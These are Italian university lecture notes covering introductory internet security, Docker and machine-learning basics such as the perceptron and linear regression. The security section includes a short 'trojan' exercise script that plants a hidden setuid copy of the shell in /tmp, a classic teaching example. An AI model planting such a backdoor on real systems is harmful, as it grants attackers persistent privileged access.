# 2022-03-14
# Cose da cercare
- [ ] [Bug dash](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=%20734869)
- [ ] PSD2
# Internet Security
![[Recording 20220314131117.webm]]

Anche solo fare una copia di file può portare problemidi sicurezza dato che si parla di permessi del file che copiandolo diventa di nostra proprietà

!def Vulnerabilità
Una vulnerabilità è una particolarità del sistema che può essere usato per perpretare azioni con intenzioni malevole

!def Attacco
La vera e propria perpretazione delle azioni malevole

> Noi dovremo imparare inquesto insegnamento metodi e tecniche fondamentali:
> - Crittografia
> - Policy
> - Conoscenza, possesso, biometria
> - Programmi di protezione
> - Protocolli di sicurezza
> - Sensibilizzazione dell'utente

```ad-def 
title:*Sicurezza*

- Non un prodotto ma un processo
- anello più debole di una catena
- Espressa sa che cosa
- Sempre soggeta all'analisi costio/benefici
- Si realizza in ppratica mediante livelli di sicurezza
```
!def Rischi di base per la sicurezza
- complessità del singolo sistema da mettere in sicurezza
- Conbinazione di sistemi
- Predisposizioni ai bug
- Proprietà emergenti
- Interazione con l'uomo

Una proprietà di sicurezza è presente quando è presente un mezzo d'attacco

## Esercizi
````ad-exercise 
title:Attacco trojan
Provare su varie distro Ubuntu

```bash
cp /bin/sh /tmp/.xxsh
chmod u+s,o+x /tmp/.xxsh
rm ./ls
ls $*
```
````

# TAP
## Argomenti
- [[#Docker]]

## Docker
!def Container
Un _container_ è un oggetto contenente la _configurazione_ e tutte le _dipendenze_ necessarie ad un *processo*

La containerizzazione dei processi fornisce isolamento, riutilizzo cross platform, ...

!def Docker vs Virtualizzazione
(Sono totalmente diversi... l'unica cosa che noto in comune è una questione di setup/configuration ed isolamento)
In comune hanno una preparazione del campo per eseguire qualcosa (dipendenze e configurazione)

# Machine Learning

generalmente il machine learning si suddivide in descriminativi e generativi

```ad-def 
title:Discriminativi
Trovare un bound di decisione che deve essere appreso
trovare una probabilità a posteriori $P(y|x)$

Gli algoritmi Deep learning fanno capo a questa categoria
```
```ad-def
title:Generativi
Apprendere la probabilità congiunta $P(y,x) = P(y|x)P(x) = P(x|y)P(y)$ 
```

!def Perceptron
Ideato nel 1958 da [...]; è basato sul design dei neuroni.

- Peso $\delta_j \forall$ Componente $x_j$ normalizzato$
- Normalizzazione: $x_j^{(i)} \in [0,1]$
- Moltiplicazione dei pesi per le componenti di input
- Somma dei prodotti
- Risultato delle somme è confrontato rispetto a t risultando $1$ quando $\sum_{j=1}^{d}{\delta_jx_j}>t$ (biass) altrimenti $0$
- Algoritmo di learning
## Algoritmi di learning
### Grid search
- $t\in\mathscr{R}$ randomica
- $\delta_j \in [0,1]$ provando un numero finito di possibilità per ognuno di loro suddividendo $[0,1]$ in $n$ valori equidistanti
### Un metodo di cui non so il nome
- $t\in\mathscr{R}$ randomica
- $\delta_j \in [0,1]$ randomici
- controllo dei risultati e calcolo dell'errore
	- $\hat{y}=sign(\sum_{j=1}^{d}{\delta_jx_j}-t)$
	- dove $t = \delta_0 x_0$;$\;x_0=1$
- correzione dei pesi
  ${\delta_j}_{\tau_1} = {\delta_j}_{\tau_0}+(y-\hat{y})\epsilon \;\forall j$ 

Nel 1969 si dimostrò che il perceptron non basta a risolvere il problema della ***XOR***
$$
\displaylines{
	\begin{cases}
		0\delta_1 &+0\delta_2 &< t &\implies t>0      \\
		1\delta_1 &+1\delta_2 &< t                     \\
		0\delta_1 &+1\delta_2 &> t &\implies \delta_2>t \\
		1\delta_1 &+0\delta_2 &> t &\implies \delta_1>t  \\
	\end{cases}\\
	\delta_1 + \delta_2 > 2t \implies t>2t
}
$$

## Regressione
> Due fasi, *learning* ed *estimation*
### Regressione lineare
Trova una retta che approssima il training set riducendo il più possibile il tasso di errore
!def Cost function
$J(\theta_0,\theta_1) = \frac{1}{2m}\sum_{i=1}^{m}{(h_\theta(x^{(i)})-y^{(i)})^2}$
